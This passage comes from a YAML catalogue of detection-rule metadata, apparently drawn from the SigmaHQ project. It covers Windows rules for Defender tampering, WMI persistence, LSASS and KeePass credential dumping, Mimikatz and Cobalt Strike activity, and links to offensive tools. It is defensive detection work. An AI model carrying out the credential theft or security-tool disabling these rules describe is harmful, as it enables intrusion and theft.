  notes: ''
- detection_id: 56abae0c-6212-4b97-adc0-0b559bb950c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_service_terminated_unexpectedly.yml
  name: Important Windows Service Terminated Unexpectedly
  description: Detects important or interesting Windows services that got terminated
    unexpectedly.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://www.randori.com/blog/vulnerability-analysis-queuejumper-cve-2023-21554/
  false_positives:
  - Rare false positives could occur since service termination could happen due to
    multiple reasons
  notes: ''
- detection_id: 91c49341-e2ef-40c0-ac45-49ec5c3fe26c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_susp_rtcore64_service_install.yml
  name: RTCore Suspicious Service Installation
  description: Detects the installation of RTCore service. Which could be an indication
    of Micro-Star MSI Afterburner vulnerable driver abuse
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques: []
  tags:
  - attack.persistence
  time_window: ''
  references:
  - https://github.com/br-sn/CheekyBlinder/blob/e1764a8a0e7cda8a3716aefa35799f560686e01c/CheekyBlinder/CheekyBlinder.cpp
  false_positives:
  - Unknown
  notes: ''
- detection_id: 5e993621-67d4-488a-b9ae-b420d08b96cb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_susp_service_installation_folder.yml
  name: Service Installation in Suspicious Folder
  description: Detects service installation in suspicious folder appdata
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - car.2013-09-005
  - attack.t1543.003
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1b2ae822-6fe1-43ba-aa7c-d1a3b3d1d5f2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_susp_service_installation_folder_pattern.yml
  name: Service Installation with Suspicious Folder Pattern
  description: Detects service installation with suspicious folder patterns
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - car.2013-09-005
  - attack.t1543.003
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 70f00d10-60b2-4f34-b9a0-dc3df3fe762a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/system/service_control_manager/win_system_susp_service_installation_script.yml
  name: Suspicious Service Installation Script
  description: Detects suspicious service installation scripts
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - car.2013-09-005
  - attack.t1543.003
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 424273ea-7cf8-43a6-b712-375f925e481f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/taskscheduler/win_taskscheduler_execution_from_susp_locations.yml
  name: Scheduled Task Executed From A Suspicious Location
  description: Detects the execution of Scheduled Tasks where the Program being run
    is located in a suspicious location or it's an unusale program to be run from
    a Scheduled Task
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: taskscheduler
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: f0767f15-0fb3-44b9-851e-e8d9a6d0005d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/taskscheduler/win_taskscheduler_lolbin_execution_via_task_scheduler.yml
  name: Scheduled Task Executed Uncommon LOLBIN
  description: Detects the execution of Scheduled Tasks where the program being run
    is located in a suspicious location or where it is an unusual program to be run
    from a Scheduled Task
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: taskscheduler
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - False positives may occur with some of the selected binaries if you have tasks
    using them (which could be very common in your environment). Exclude all the specific
    trusted tasks before using this rule
  notes: ''
- detection_id: 9e3cb244-bdb8-4632-8c90-6079c8f4f16d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/taskscheduler/win_taskscheduler_susp_schtasks_delete.yml
  name: Important Scheduled Task Deleted
  description: 'Detects when adversaries try to stop system services or processes
    by deleting their respective scheduled tasks in order to conduct data destructive
    activities

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: taskscheduler
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1489
  tags:
  - attack.impact
  - attack.t1489
  time_window: ''
  references:
  - https://www.socinvestigation.com/most-common-windows-event-ids-to-hunt-mind-map/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 64d51a51-32a6-49f0-9f3d-17e34d640272
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/terminalservices/win_terminalservices_rdp_ngrok.yml
  name: Ngrok Usage with Remote Desktop Service
  description: Detects cases in which ngrok, a reverse proxy tool, forwards events
    to the local RDP port, which could be a sign of malicious behaviour
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: terminalservices-localsessionmanager
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1090
  tags:
  - attack.command-and-control
  - attack.t1090
  time_window: ''
  references:
  - https://twitter.com/tekdefense/status/1519711183162556416?s=12&t=OTsHCBkQOTNs1k3USz65Zg
  - https://ngrok.com/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 06d71506-7beb-4f22-8888-e2e5e2ca7fd8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/win_alert_mimikatz_keywords.yml
  name: Mimikatz Use
  description: This method detects mimikatz keywords in different Eventlogs (some
    of them only appear in older Mimikatz version that are however still used by different
    threat groups)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1003.002
  - T1003.004
  - T1003.006
  tags:
  - attack.s0002
  - attack.lateral-movement
  - attack.credential-access
  - car.2013-07-001
  - car.2019-04-004
  - attack.t1003.002
  - attack.t1003.004
  - attack.t1003.001
  - attack.t1003.006
  time_window: ''
  references:
  - https://tools.thehacker.recipes/mimikatz/modules
  false_positives:
  - Naughty administrators
  - AV Signature updates
  - Files with Mimikatz in their filename
  notes: ''
- detection_id: 360a1340-398a-46b6-8d06-99b905dc69d2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_antimalware_platform_expired.yml
  name: Windows Defender Grace Period Expired
  description: 'Detects the expiration of the grace period of Windows Defender. This
    means protection against viruses, spyware, and other potentially unwanted software
    is disabled.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide#event-id-5101
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://craigclouditpro.wordpress.com/2020/03/04/hunting-malicious-windows-defender-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a0a278fe-2c0e-4de2-ac3c-c68b08a9ba98
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_asr_lsass_access.yml
  name: LSASS Access Detected via Attack Surface Reduction
  description: Detects Access to LSASS Process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction
  false_positives:
  - Google Chrome GoogleUpdate.exe
  - Some Taskmgr.exe related activity
  notes: ''
- detection_id: 97b9ce1e-c5ab-11ea-87d0-0242ac130003
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_asr_psexec_wmi.yml
  name: PSExec and WMI Process Creations Block
  description: Detects blocking of process creations originating from PSExec and WMI
    commands
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1047
  - T1569.002
  tags:
  - attack.execution
  - attack.lateral-movement
  - attack.t1047
  - attack.t1569.002
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference?view=o365-worldwide#block-process-creations-originating-from-psexec-and-wmi-commands
  - https://twitter.com/duff22b/status/1280166329660497920
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1321dc4e-a1fe-481d-a016-52c45f0c8b4f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_config_change_exclusion_added.yml
  name: Windows Defender Exclusions Added
  description: Detects the Setting of Windows Defender Exclusions
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://twitter.com/_nullbind/status/1204923340810543109
  false_positives:
  - Administrator actions
  notes: ''
- detection_id: a3ab73f1-bd46-4319-8f06-4b20d0617886
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_config_change_exploit_guard_tamper.yml
  name: Windows Defender Exploit Guard Tamper
  description: 'Detects when someone is adding or removing applications or folders
    from exploit guard "ProtectedFolders" or "AllowedApplications"

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: test
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/windows-10-controlled-folder-access-event-search/ba-p/2326088
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 91903aba-1088-42ee-b680-d6d94fe002b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_config_change_sample_submission_consent.yml
  name: Windows Defender Submit Sample Feature Disabled
  description: Detects disabling of the "Automatic Sample Submission" feature of Windows
    Defender.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: low
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide
  - https://bidouillesecurity.com/disable-windows-defender-in-powershell/#DisableAntiSpyware
  false_positives:
  - Administrator activity (must be investigated)
  notes: ''
- detection_id: 2afe6582-e149-11ea-87d0-0242ac130003
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_history_delete.yml
  name: Windows Defender Malware Detection History Deletion
  description: Windows Defender logs when the history of detected infections is deleted.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus
  - https://web.archive.org/web/20160727113019/https://answers.microsoft.com/en-us/protect/forum/mse-protect_scanning/microsoft-antimalware-has-removed-history-of/f15af6c9-01a9-4065-8c6c-3f2bdc7de45e
  false_positives:
  - Deletion of Defender malware detections history for legitimate reasons
  notes: ''
- detection_id: bc275be9-0bec-4d77-8c8f-281a2df6710f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_malware_and_pua_scan_disabled.yml
  name: Windows Defender Malware And PUA Scanning Disabled
  description: Detects disabling of the Windows Defender feature of scanning for malware
    and other potentially unwanted software
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide#event-id-5010
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://craigclouditpro.wordpress.com/2020/03/04/hunting-malicious-windows-defender-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: ea9bf0fa-edec-4fb8-8b78-b119f2528186
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_malware_detected_amsi_source.yml
  name: Windows Defender AMSI Trigger Detected
  description: Detects triggering of AMSI by Windows Defender.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps
  false_positives:
  - Unlikely
  notes: ''
- detection_id: b28e58e4-2a72-4fae-bdee-0fbe904db642
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_real_time_protection_disabled.yml
  name: Windows Defender Real-time Protection Disabled
  description: 'Detects disabling of Windows Defender Real-time Protection. As this
    event doesn''t contain a lot of information on who initiated this action you might
    want to reduce it to a "medium" level if this occurs too many times in your environment

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide#event-id-5001
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://craigclouditpro.wordpress.com/2020/03/04/hunting-malicious-windows-defender-activity/
  false_positives:
  - Administrator actions (should be investigated)
  - Seen being triggered occasionally during Windows 8 Defender Updates
  notes: ''
- detection_id: dd80db93-6ec2-4f4c-a017-ad40da6ffe81
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_real_time_protection_errors.yml
  name: Windows Defender Real-Time Protection Failure/Restart
  description: Detects issues with Windows Defender Real-Time Protection features
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - Internal Research
  - https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/
  - https://gist.github.com/nasbench/33732d6705cbdc712fae356f07666346
  false_positives:
  - Some crashes can occur sometimes and the event doesn't provide enough information
    to tune out these cases. Manual exception is required
  notes: ''
- detection_id: bc92ca75-cd42-4d61-9a37-9d5aa259c88b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_restored_quarantine_file.yml
  name: Win Defender Restored Quarantine File
  description: Detects the restoration of files from the defender quarantine
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide
  false_positives:
  - Legitimate administrator activity restoring a file
  notes: ''
- detection_id: 801bd44f-ceed-4eb6-887c-11544633c0aa
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_suspicious_features_tampering.yml
  name: Windows Defender Configuration Changes
  description: Detects suspicious changes to the Windows Defender configuration
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: high
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide
  - https://bidouillesecurity.com/disable-windows-defender-in-powershell/#DisableAntiSpyware
  false_positives:
  - Administrator activity (must be investigated)
  notes: ''
- detection_id: 49e5bc24-8b86-49f1-b743-535f332c2856
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_tamper_protection_trigger.yml
  name: Microsoft Defender Tamper Protection Trigger
  description: Detects blocked attempts to change any of Defender's settings such
    as "Real Time Monitoring" and "Behavior Monitoring"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://bhabeshraj.com/post/tampering-with-microsoft-defenders-tamper-protection
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide
  false_positives:
  - Administrator might try to disable defender features during testing (must be investigated)
  notes: ''
- detection_id: 57b649ef-ff42-4fb0-8bf6-62da243a1708
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_threat.yml
  name: Windows Defender Threat Detected
  description: Detects actions taken by Windows Defender malware detection engines
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 686c0b4b-9dd3-4847-9077-d6c1bbe36fcb
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/windefend/win_defender_virus_scan_disabled.yml
  name: Windows Defender Virus Scanning Feature Disabled
  description: Detects disabling of the Windows Defender virus scanning feature
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windefend
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1562.001
  tags:
  - attack.defense-evasion
  - attack.t1562.001
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide#event-id-5012
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1562.001/T1562.001.md
  - https://craigclouditpro.wordpress.com/2020/03/04/hunting-malicious-windows-defender-activity/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 0b7889b4-5577-4521-a60a-3376ee7f9f7b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/builtin/wmi/win_wmi_persistence.yml
  name: WMI Persistence
  description: Detects suspicious WMI event filter and command line event consumer
    based on WMI and Security Logs.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: wmi
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.003
  tags:
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1546.003
  time_window: ''
  references:
  - https://twitter.com/mattifestation/status/899646620148539397
  - https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/
  false_positives:
  - Unknown (data set is too small; further testing needed)
  notes: ''
- detection_id: 2e4e488a-6164-4811-9ea1-f960c7359c40
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_hktl_cactustorch.yml
  name: HackTool - CACTUSTORCH Remote Thread Creation
  description: Detects remote thread creation from CACTUSTORCH as described in references.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1055.012
  - T1059.005
  - T1059.007
  - T1218.005
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.execution
  - attack.t1055.012
  - attack.t1059.005
  - attack.t1059.007
  - attack.t1218.005
  time_window: ''
  references:
  - https://twitter.com/SBousseaden/status/1090588499517079552
  - https://github.com/mdsecactivebreach/CACTUSTORCH
  false_positives:
  - Unknown
  notes: ''
- detection_id: 6309645e-122d-4c5b-bb2b-22e4f9c2fa42
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_hktl_cobaltstrike.yml
  name: HackTool - Potential CobaltStrike Process Injection
  description: Detects a potential remote threat creation with certain characteristics
    which are typical for Cobalt Strike beacons
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1055.001
  tags:
  - attack.privilege-escalation
  - attack.defense-evasion
  - attack.t1055.001
  time_window: ''
  references:
  - https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f
  - https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 77564cc2-7382-438b-a7f6-395c2ae53b9a
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_keepass.yml
  name: Remote Thread Created In KeePass.EXE
  description: Detects remote thread creation in "KeePass.exe" which could indicates
    potential password dumping activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1555.005
  tags:
  - attack.credential-access
  - attack.t1555.005
  time_window: ''
  references:
  - https://www.cisa.gov/uscert/ncas/alerts/aa20-259a
  - https://github.com/denandz/KeeFarce
  - https://github.com/GhostPack/KeeThief
  false_positives:
  - Unknown
  notes: ''
- detection_id: c0aac16a-b1e7-4330-bab0-3c27bb4987c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_mstsc_susp_location.yml
  name: Remote Thread Creation In Mstsc.Exe From Suspicious Location
  description: 'Detects remote thread creation in the "mstsc.exe" process by a process
    located in a potentially suspicious location.

    This technique is often used by attackers in order to hook some APIs used by DLLs
    loaded by "mstsc.exe" during RDP authentications in order to steal credentials.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.credential-access
  time_window: ''
  references:
  - https://github.com/S12cybersecurity/RDPCredentialStealer/blob/1b8947cdd065a06c1b62e80967d3c7af895fcfed/APIHookInjectorBin/APIHookInjectorBin/Inject.h#L25
  false_positives:
  - Unknown
  notes: ''
- detection_id: fb656378-f909-47c1-8747-278bf09f4f4f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_powershell_lsass.yml
  name: Potential Credential Dumping Attempt Via PowerShell Remote Thread
  description: Detects remote thread creation by PowerShell processes into "lsass.exe"
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  tags:
  - attack.credential-access
  - attack.t1003.001
  time_window: ''
  references:
  - https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse
  false_positives:
  - Unknown
  notes: ''
- detection_id: 99b97608-3e21-4bfe-8217-2a127c396a0e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_powershell_susp_targets.yml
  name: Remote Thread Creation Via PowerShell In Uncommon Target
  description: Detects the creation of a remote thread from a Powershell process in
    an uncommon target process
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218.011
  - attack.t1059.001
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: f239b326-2f41-4d6b-9dfa-c846a60ef505
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/create_remote_thread/create_remote_thread_win_susp_password_dumper_lsass.yml
  name: Password Dumper Remote Thread in LSASS
  description: 'Detects password dumper activity by monitoring remote thread creation
    EventID 8 in combination with the lsass.exe process as TargetImage.

    The process in field Process is the malicious program. A single execution can
    lead to hundreds of events.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
